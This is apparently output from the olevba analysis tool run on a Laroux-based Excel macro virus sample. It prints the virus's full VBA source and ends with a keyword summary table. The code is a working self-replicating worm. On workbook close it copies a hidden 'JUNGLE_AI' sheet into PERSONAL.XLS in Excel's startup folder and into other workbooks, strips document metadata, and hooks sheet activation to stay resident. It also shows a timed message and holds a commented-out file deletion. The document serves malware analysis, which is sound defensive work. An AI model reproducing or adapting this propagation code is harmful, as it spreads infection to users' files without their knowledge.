olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-3064bc61af41282744e354c4eadbd886973d02fe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO JUNGLE_AI.bas 
in file: Virus.MSExcel.Laroux-based-3064bc61af41282744e354c4eadbd886973d02fe - OLE stream: '_VBA_PROJECT_CUR/VBA/JUNGLE_AI'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'
Sub auto_open()
Attribute auto_open.VB_Description = "Macro recorded 09/02/1999 by pkgaim"
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n0"
I = Date
P$ = Str(I)
P1$ = Left(P$, 2)
If P1$ = "25" Then
'Kill "J*.*"
Else
End If
T = TimeValue(Time)
X$ = Str(T)
M$ = Left(X$, 2)
If M$ = "18" Or M$ = "6:" Or M$ = "06" Then
MsgBox ("VIRUS JUNGLE_AI")
Else
End If
End Sub

Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
H$ = ActiveWorkbook.Name
P$ = ActiveWorkbook.Path
S$ = Workbooks(H$).Sheets(1).Name
If S$ <> "JUNGLE_AI" Then
Workbooks("PERSONAL.XLS").Sheets("JUNGLE_AI").Copy BEFORE:=Workbooks(H$).Sheets(1)
Workbooks(H$).Sheets("JUNGLE_AI").Visible = False
Else
ST$ = Application.StartupPath
PE$ = Dir(ST$ & "\" & "PERSONAL.XLS")
If PE$ = "PERSONAL.XLS" Then
C = 1
Else
C = 0
End If
Application.ScreenUpdating = False
If C = 1 Then
N$ = ActiveWorkbook.Name
S$ = Workbooks("PERSONAL.XLS").Sheets(1).Name
If S$ <> "JUNGLE_AI" Then
'SAVE AS------
Windows("PERSONAL.XLS").Visible = True
Workbooks(N$).Sheets("JUNGLE_AI").Copy BEFORE:=Workbooks("PERSONAL.XLS").Sheets(1)
Windows("PERSONAL.XLS").Visible = False
'--------------
Else
End If
Else
'SAVE AS NEW------
Application.ScreenUpdating = False
N$ = ActiveWorkbook.Name
Sheets("JUNGLE_AI").Visible = True
Sheets("JUNGLE_AI").Select
CUR$ = CurDir()
With ActiveWorkbook
        .Title = ""
       .Subject = ""
       .Author = ""
       .Keywords = ""
      .Comments = ""
  End With
N1$ = ActiveWorkbook.Name
ChDir Application.StartupPath
ActiveWindow.Visible = False
Workbooks(N1$).SaveAs Filename:=Application.StartupPath & "\" & "PERSONAL.XLS", FileFormat:=xlNormal, _
        Password:="", WriteResPassword:="", ReadOnlyRecommended:=False _
        , CreateBackup:=False
        ChDir CUR$

'--------------
End If
End If
Application.OnSheetActivate = ""
Application.ScreenUpdating = True
Application.OnSheetActivate = "PERSONAL.XLS!JUNGLE_AI"
End Sub



-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     17 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  JUNGLE_A
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

